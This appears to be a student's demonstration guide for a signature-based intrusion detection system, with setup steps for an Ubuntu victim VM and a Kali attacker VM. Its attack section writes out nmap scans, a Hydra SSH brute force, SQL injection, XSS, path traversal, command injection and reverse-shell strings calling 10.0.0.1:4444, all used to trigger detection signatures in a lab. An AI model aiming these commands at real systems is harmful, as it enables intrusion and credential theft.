# IDS Project Demonstration Guide

A comprehensive guide for demonstrating the Network Intrusion Detection System (IDS) in a controlled lab environment with Ubuntu (victim) and Kali Linux (attacker) virtual machines.

---

## Table of Contents

1. [Lab Environment Overview](#lab-environment-overview)
2. [Victim VM Setup (Ubuntu)](#victim-vm-setup-ubuntu)
3. [Attacker VM Setup (Kali Linux)](#attacker-vm-setup-kali-linux)
4. [Starting the IDS](#starting-the-ids)
5. [Attack Simulations](#attack-simulations)
6. [Viewing and Analyzing Alerts](#viewing-and-analyzing-alerts)
7. [Demo Script for Viva](#demo-script-for-viva)
8. [Troubleshooting](#troubleshooting)

---

## Lab Environment Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                      Virtual Network                             │
│                                                                  │
│   ┌──────────────────┐              ┌──────────────────┐        │
│   │   ATTACKER VM    │              │    VICTIM VM     │        │
│   │   Kali Linux     │    ────►     │     Ubuntu       │        │
│   │                  │   Attacks    │                  │        │
│   │   192.168.1.100  │              │   192.168.1.50   │        │
│   │                  │              │                  │        │
│   │   Tools:         │              │   Services:      │        │
│   │   - nmap         │              │   - IDS Backend  │        │
│   │   - hydra        │              │   - SSH (22)     │        │
│   │   - curl         │              │   - HTTP (80)    │        │
│   │   - nikto        │              │   - API (8000)   │        │
│   └──────────────────┘              └──────────────────┘        │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Network Requirements

| VM       | OS            | IP Address (Example) | Role                      |
| -------- | ------------- | -------------------- | ------------------------- |
| Victim   | Ubuntu 22.04+ | 192.168.1.50         | Runs IDS, target services |
| Attacker | Kali Linux    | 192.168.1.100        | Launches attacks          |

> **Note**: Both VMs should be on the same virtual network (NAT Network or Host-Only in VirtualBox/VMware)

---

## Victim VM Setup (Ubuntu)

### Step 1: System Preparation

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install required packages
sudo apt install -y python3 python3-pip python3-venv git curl net-tools

# Install optional services for attack targets
sudo apt install -y openssh-server apache2
```

### Step 2: Configure Network Services

```bash
# Start SSH service
sudo systemctl start ssh
sudo systemctl enable ssh

# Start Apache (optional - for web attack demos)
sudo systemctl start apache2
sudo systemctl enable apache2

# Check services are running
sudo systemctl status ssh
sudo systemctl status apache2
```

### Step 3: Clone and Setup IDS

```bash
# Navigate to home directory
cd ~

# Clone project (or copy from USB/shared folder)
git clone <your-repo-url> ids-project
cd ids-project/ids-backend

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

### Step 4: Find Network Interface

```bash
# List network interfaces
ip link show

# Or use
ip addr

# Common interface names:
# - eth0, ens33, enp0s3 (wired)
# - wlan0 (wireless)
```

### Step 5: Configure IDS

```bash
# Edit configuration
nano .env
```

Update the `.env` file:

```env
# Application Settings
APP_NAME="IDS Backend"
APP_VERSION="1.0.0"
DEBUG=true

# Database
DATABASE_URL=sqlite:///./data/ids.db

# Network Capture - UPDATE THIS!
NETWORK_INTERFACE=ens33
CAPTURE_FILTER=ip
CAPTURE_TIMEOUT=10

# Logging
LOG_LEVEL=DEBUG
LOG_FILE=data/ids.log

# Alert Management
ALERT_RETENTION_DAYS=30
```

### Step 6: Initialize Database and Load Signatures

```bash
# Ensure venv is activated
source venv/bin/activate

# Load signatures into database
python scripts/load_signatures.py

# Expected output:
# ==================================================
# IDS Signature Loader
# ==================================================
#
# Results:
#   Loaded:  15
#   Skipped: 0 (already exist)
#   Errors:  0
```

### Step 7: Get Victim IP Address

```bash
# Note this IP for attack simulations
ip addr show ens33 | grep "inet "

# Example output: inet 192.168.1.50/24
```

---

## Attacker VM Setup (Kali Linux)

### Step 1: Verify Tools Available

```bash
# These tools come pre-installed on Kali
which nmap
which hydra
which nikto
which curl

# Update if needed
sudo apt update
```

### Step 2: Test Connectivity to Victim

```bash
# Replace with your victim's IP
export VICTIM_IP=192.168.1.50

# Test connectivity
ping -c 3 $VICTIM_IP
```

---

## Starting the IDS

### On Victim VM (Ubuntu)

#### Terminal 1: Start the API Server

```bash
cd ~/ids-project/ids-backend
source venv/bin/activate

# Start with sudo for packet capture permissions
sudo venv/bin/uvicorn app.main:app --host 0.0.0.0 --port 8000
```

Expected output:

```
INFO:     Started server process [12345]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
INFO:     Uvicorn running on http://0.0.0.0:8000
```

#### Terminal 2: Start Detection Engine

```bash
# Start the detection engine via API
curl -X POST http://localhost:8000/api/v1/system/detection/start

# Expected response:
# {"status":"started","message":"Detection engine started successfully"}
```

#### Verify System Status

```bash
# Check full status
curl http://localhost:8000/api/v1/system/status | python3 -m json.tool

# Expected output:
# {
#     "app_name": "IDS Backend",
#     "version": "1.0.0",
#     "detection_running": true,
#     "signatures_loaded": 15,
#     "packets_processed": 0,
#     "alerts_generated": 0,
#     ...
# }
```

#### Verify Signatures Loaded

```bash
curl http://localhost:8000/api/v1/signatures | python3 -m json.tool
```

---

## Attack Simulations

Run these commands from the **Kali Linux (Attacker) VM**.

### Set Target Variable

```bash
# Set the victim IP (adjust to your setup)
export TARGET=192.168.1.50
```

---

### Attack 1: ICMP Ping Sweep

**Purpose**: Triggers "ICMP Ping Sweep" signature

```bash
# Simple ping
ping -c 10 $TARGET

# Aggressive ping flood (requires root)
sudo ping -f -c 100 $TARGET
```

**Expected Signature Match**: `ICMP Ping Sweep`  
**Severity**: Low

---

### Attack 2: TCP SYN Port Scan (Nmap)

**Purpose**: Triggers "TCP SYN Scan Detection" and "Nmap Service Detection"

```bash
# Basic SYN scan
sudo nmap -sS $TARGET

# Scan specific ports
sudo nmap -sS -p 22,80,443,8080 $TARGET

# Aggressive scan with service detection
sudo nmap -sS -sV -A $TARGET

# Full port scan
sudo nmap -sS -p- $TARGET
```

**Expected Signature Match**: `TCP SYN Scan Detection`, `Nmap Service Detection`  
**Severity**: Medium

---

### Attack 3: SSH Brute Force Attempt

**Purpose**: Triggers "SSH Brute Force Attempt" signature

```bash
# Using Hydra (password list attack)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4 -V

# Simpler version with small wordlist
echo -e "admin\npassword\n123456\nroot" > /tmp/passwords.txt
hydra -l admin -P /tmp/passwords.txt ssh://$TARGET -t 4 -V

# Manual SSH connection attempts
for i in {1..10}; do
    sshpass -p 'wrongpassword' ssh -o StrictHostKeyChecking=no root@$TARGET 2>/dev/null
done
```

**Expected Signature Match**: `SSH Brute Force Attempt`  
**Severity**: High

---

### Attack 4: SQL Injection Attempt

**Purpose**: Triggers "SQL Injection Attempt" signature

```bash
# Classic SQL injection patterns
curl "http://$TARGET/?id=1' OR '1'='1"
curl "http://$TARGET/?id=1; DROP TABLE users--"
curl "http://$TARGET/?user=admin'--"
curl "http://$TARGET/?id=1 UNION SELECT * FROM users"
curl "http://$TARGET/login?username=admin&password=' OR '1'='1"

# POST request with SQL injection
curl -X POST "http://$TARGET/login" \
  -d "username=admin' OR '1'='1&password=anything"
```

**Expected Signature Match**: `SQL Injection Attempt`  
**Severity**: Critical

---

### Attack 5: XSS (Cross-Site Scripting) Attempt

**Purpose**: Triggers "XSS Attempt Detection" signature

```bash
# XSS payloads
curl "http://$TARGET/?search=<script>alert('XSS')</script>"
curl "http://$TARGET/?name=<img src=x onerror=alert('XSS')>"
curl "http://$TARGET/?q=javascript:alert(1)"
curl "http://$TARGET/?input=<body onload=alert('XSS')>"
```

**Expected Signature Match**: `XSS Attempt Detection`  
**Severity**: High

---

### Attack 6: Directory Traversal Attempt

**Purpose**: Triggers "Directory Traversal Attempt" signature

```bash
# Path traversal attacks
curl "http://$TARGET/file?name=../../../etc/passwd"
curl "http://$TARGET/download?file=....//....//etc/shadow"
curl "http://$TARGET/page?path=%2e%2e%2f%2e%2e%2fetc/passwd"
curl "http://$TARGET/read?doc=..\\..\\..\\windows\\system32\\config\\sam"
```

**Expected Signature Match**: `Directory Traversal Attempt`  
**Severity**: High

---

### Attack 7: Command Injection Attempt

**Purpose**: Triggers "Shell Command Injection" signature

```bash
# Command injection payloads
curl "http://$TARGET/ping?host=;cat /etc/passwd"
curl "http://$TARGET/lookup?domain=|whoami"
curl "http://$TARGET/exec?cmd=\`id\`"
curl "http://$TARGET/run?command=;ls -la"
```

**Expected Signature Match**: `Shell Command Injection`  
**Severity**: Critical

---

### Attack 8: FTP/Telnet Access Attempts

**Purpose**: Triggers "FTP Login Attempt" and "Telnet Access Attempt" signatures

```bash
# FTP connection attempt
ftp $TARGET

# Telnet connection attempt
telnet $TARGET 23

# Nmap scan on these ports
nmap -sS -p 21,23 $TARGET
```

**Expected Signature Match**: `FTP Login Attempt`, `Telnet Access Attempt`  
**Severity**: Medium

---

### Attack 9: SMB Connection Attempt

**Purpose**: Triggers "SMB Connection Attempt" signature

```bash
# SMB enumeration
smbclient -L //$TARGET -N
nmap -p 445 --script smb-enum-shares $TARGET

# Using enum4linux
enum4linux $TARGET
```

**Expected Signature Match**: `SMB Connection Attempt`  
**Severity**: Medium

---

### Attack 10: Reverse Shell Detection (Simulated)

**Purpose**: Triggers "Reverse Shell Detection" signature

```bash
# Send payload patterns (won't execute, just triggers signature)
curl "http://$TARGET/?cmd=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
curl "http://$TARGET/?exec=python -c 'import socket'"
curl "http://$TARGET/?run=nc -e /bin/bash 10.0.0.1 4444"
```

**Expected Signature Match**: `Reverse Shell Detection`  
**Severity**: Critical

---

## Viewing and Analyzing Alerts

### On Victim VM - Check Alerts

```bash
# Get all alerts
curl http://localhost:8000/api/v1/alerts | python3 -m json.tool

# Get alert statistics
curl http://localhost:8000/api/v1/alerts/stats | python3 -m json.tool

# Filter by severity
curl "http://localhost:8000/api/v1/alerts?severity=critical" | python3 -m json.tool
curl "http://localhost:8000/api/v1/alerts?severity=high" | python3 -m json.tool

# Get specific alert details
curl http://localhost:8000/api/v1/alerts/1 | python3 -m json.tool
```

### Using Web Browser

Open in browser on victim or any machine on the network:

- **Swagger UI**: http://192.168.1.50:8000/docs
- **Alerts endpoint**: http://192.168.1.50:8000/api/v1/alerts
- **Stats endpoint**: http://192.168.1.50:8000/api/v1/alerts/stats

### Check System Status

```bash
# Full system status
curl http://localhost:8000/api/v1/system/status | python3 -m json.tool

# Should show:
# - detection_running: true
# - packets_processed: <increasing number>
# - alerts_generated: <number of alerts>
```

### View Logs (Real-time)

```bash
# On victim VM, open another terminal
tail -f ~/ids-project/ids-backend/data/ids.log
```

---

## Demo Script for Viva

### Suggested Presentation Flow (15-20 minutes)

#### Part 1: Introduction (2 minutes)

1. Explain what an IDS is
2. Describe signature-based detection vs anomaly-based
3. Show architecture diagram

#### Part 2: System Setup (3 minutes)

1. Show the Ubuntu victim VM
2. Explain the project structure
3. Show configuration file (`.env`)
4. Show signature file (`app/signatures/default.json`)

#### Part 3: Start the IDS (2 minutes)

```bash
# Start API server (show terminal)
sudo venv/bin/uvicorn app.main:app --host 0.0.0.0 --port 8000

# Start detection
curl -X POST http://localhost:8000/api/v1/system/detection/start

# Show status
curl http://localhost:8000/api/v1/system/status | python3 -m json.tool
```

#### Part 4: Attack Demonstrations (8 minutes)

**Demo Attack 1: Port Scan**

```bash
# On Kali
sudo nmap -sS 192.168.1.50

# On Ubuntu - show alert
curl http://localhost:8000/api/v1/alerts | python3 -m json.tool
```

**Demo Attack 2: SQL Injection**

```bash
# On Kali
curl "http://192.168.1.50/?id=1' OR '1'='1"

# On Ubuntu - show critical alert
curl "http://localhost:8000/api/v1/alerts?severity=critical" | python3 -m json.tool
```

**Demo Attack 3: SSH Brute Force**

```bash
# On Kali
hydra -l root -P /tmp/passwords.txt ssh://192.168.1.50 -t 4

# On Ubuntu - show high severity alert
curl "http://localhost:8000/api/v1/alerts?severity=high" | python3 -m json.tool
```

#### Part 5: Alert Management (3 minutes)

```bash
# Show alert statistics
curl http://localhost:8000/api/v1/alerts/stats | python3 -m json.tool

# Show Swagger UI in browser
# Open http://192.168.1.50:8000/docs

# Acknowledge an alert
curl -X PATCH http://localhost:8000/api/v1/alerts/1/status \
  -H "Content-Type: application/json" \
  -d '{"status": "acknowledged"}'
```

#### Part 6: Q&A Preparation

**Common Questions:**

1. **Why signature-based instead of anomaly-based?**
   - Lower false positive rate
   - Easier to understand and explain
   - Suitable for known attack patterns
   - Less computational overhead

2. **How does packet capture work?**
   - Uses Scapy library
   - Captures raw packets from network interface
   - Requires root/admin privileges

3. **How are signatures matched?**
   - Protocol matching (TCP/UDP/ICMP)
   - IP address matching (with CIDR support)
   - Port matching (single, range, list)
   - Regex pattern matching on payload

4. **What happens when an attack is detected?**
   - Alert created in database
   - Severity assigned from signature
   - Similar alerts aggregated within time window
   - Available via REST API

5. **Limitations of this system?**
   - Cannot detect encrypted traffic content
   - Cannot detect zero-day attacks (no signature)
   - Single-machine deployment
   - No automated response/blocking

---

## Troubleshooting

### IDS Not Starting

```bash
# Check Python and dependencies
python3 --version
pip list | grep -E "fastapi|scapy|sqlalchemy"

# Check permissions
sudo ls -la venv/bin/python3

# Test Scapy manually
sudo python3 -c "from scapy.all import sniff; print('Scapy OK')"
```

### No Alerts Generated

```bash
# 1. Check detection is running
curl http://localhost:8000/api/v1/system/status

# 2. Check signatures are loaded
curl http://localhost:8000/api/v1/signatures

# 3. Check correct interface
ip link show
cat .env | grep NETWORK_INTERFACE

# 4. Test packet capture manually
sudo tcpdump -i ens33 -c 10
```

### Network Connectivity Issues

```bash
# On Kali - check connectivity
ping <victim_ip>
traceroute <victim_ip>

# On Ubuntu - check firewall
sudo ufw status
sudo ufw disable  # Temporarily for demo
```

### Database Issues

```bash
# Reset database
rm data/ids.db
python scripts/load_signatures.py

# Check database exists
ls -la data/
```

### Permission Denied Errors

```bash
# Set capability (persistent)
sudo setcap cap_net_raw+ep venv/bin/python3

# Or always run with sudo
sudo venv/bin/uvicorn app.main:app --host 0.0.0.0 --port 8000
```

---

## Quick Reference Card

### Victim VM (Ubuntu) Commands

| Action          | Command                                                            |
| --------------- | ------------------------------------------------------------------ |
| Start IDS       | `sudo venv/bin/uvicorn app.main:app --host 0.0.0.0 --port 8000`    |
| Start Detection | `curl -X POST http://localhost:8000/api/v1/system/detection/start` |
| Stop Detection  | `curl -X POST http://localhost:8000/api/v1/system/detection/stop`  |
| Check Status    | `curl http://localhost:8000/api/v1/system/status`                  |
| View Alerts     | `curl http://localhost:8000/api/v1/alerts`                         |
| Alert Stats     | `curl http://localhost:8000/api/v1/alerts/stats`                   |
| View Logs       | `tail -f data/ids.log`                                             |

### Attacker VM (Kali) Commands

| Attack Type       | Command                                              |
| ----------------- | ---------------------------------------------------- |
| Ping Sweep        | `ping -c 10 $TARGET`                                 |
| Port Scan         | `sudo nmap -sS $TARGET`                              |
| SSH Brute Force   | `hydra -l root -P passwords.txt ssh://$TARGET`       |
| SQL Injection     | `curl "http://$TARGET/?id=1' OR '1'='1"`             |
| XSS               | `curl "http://$TARGET/?q=<script>alert(1)</script>"` |
| Dir Traversal     | `curl "http://$TARGET/?file=../../../etc/passwd"`    |
| Command Injection | `curl "http://$TARGET/?cmd=;cat /etc/passwd"`        |

---

## Checklist Before Demo

- [ ] Both VMs powered on and networked
- [ ] Can ping victim from attacker
- [ ] IDS dependencies installed
- [ ] Signatures loaded (15 signatures)
- [ ] API server running
- [ ] Detection engine started
- [ ] Swagger UI accessible in browser
- [ ] Terminal windows arranged for visibility
- [ ] Attack commands prepared/copied

---

**Good luck with your demonstration!** 🎓
